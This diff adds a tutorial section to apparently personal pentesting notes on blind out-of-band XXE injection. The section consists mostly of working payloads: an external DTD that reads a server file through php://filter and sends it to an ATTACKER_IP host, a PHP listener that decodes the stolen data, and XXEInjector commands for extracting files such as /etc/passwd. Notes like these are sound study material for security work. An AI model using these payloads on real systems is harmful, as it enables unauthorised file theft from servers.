@@ -204,4 +204,99 @@ Lastly, we send the following *XXE* payload, which loads the external *DTD* and 
 
 ---
 
-#### *Blind XXE*
+#### *Blind OOB XXE*
+
+When we talk about a *Blind XXE*, we should know that we do not recieve neither any output from the *XML* entities we define before sending the payload nor any *PHP* errors displayed
+
+##### *Manual*
+
+So, once again, due to the limitation applied to the internal subset during the *XML* processing carried out by the parser, where it processes the external parameter entity declaration but does not populate its content with the referenced resource, we cannot define all the parameter entity statements within the internal subset *( internal DTD )* as the parser does not support external parameter entity references within a entity declaration, such as follows
+
+###### *Bad* ❌
+
+```bash
+<!DOCTYPE foo [
+	<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+	<!ENTITY % param1 "<!ENTITY content 'http://<ATTACKER>:<PORT>/%file;>'">
+	%param1;
+]>
+<element>&content;</element>
+```
+
+As stated, the above structure will not work as within the internal subset *( DTD )*, there is an external parameter entity *( %file )* which is being referenced within the declaration of another parameter entity *( %param1 )*
+
+Therefore, in order to accomplish the *Out-of-Band XXE*, we must create an external *DTD* and set up an *HTTP* server hosting the given resource
+
+###### *Creating an External DTD*
+
+```bash
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:<PORT>/?content=%file;>'">
+```
+
+###### *Setting up an HTTP server*
+
+Before setting up the server, we will create a *PHP* script called *index.php*, which will process the given *HTTP* parameter and *base64-decode* its content
+
+```php title="index.php"
+<?php
+if (isset($_GET['content']))
+{
+	print_r("\n\n" . base64_decode($_GET['content']));
+} else {
+	die("HTTP Parameter not specified");
+}
+```
+
+Then, we set up an *HTTP* server
+
+```bash
+php -S 0.0.0.0:<PORT>
+```
+
+###### *Sending the XXE Payload*
+
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+	<!ENTITY % dtd SYSTEM "http://<ATTACKER_IP>:<PORT>/evil.dtd">
+	%dtd;
+	%oob;
+]>
+<element>&content;</element>
+```
+
+##### *Automatic*
+
+###### *XXEInjector*
+
+> ***[XXEInjector](https://github.com/enjoiz/XXEinjector)***
+
+- ***Setup***
+
+```bash
+git clone https://github.com/enjoiz/XXEinjector XXEInjector
+cd !$
+```
+
+- ***Usage***
+
+Once we have cloned the git repository, we can use an *HTTP* proxy, such as *BURP*, to intercept the given request and copy its content to a file in order to pass it to the tool, such as follows
+
+```bash
+ruby XXEInjector.rb --host=<ATTACKER_IP> --httpport=<ATTACKER_PORT> --file=<REQUEST_FILE> --path=<FILE_TO_DISCLOSE> --oob=http --phpfilter
+```
+
+But, before running the command above, we must set up an *HTTP* server
+
+```bash
+php -S 0.0.0.0:<PORT>
+```
+
+The fist command will perform an *OOB XXE*, like the ***[[#Blind OOB XXE#Manual|manual]]*** method
+
+Then, we will find the output of the specified file under this path, within the tool directory
+
+```bash
+Logs/<TARGET>/<RESOURCE_FULL_PATH>.log # e.g. Logs/10.129.201.94/etc/passwd.log
+```
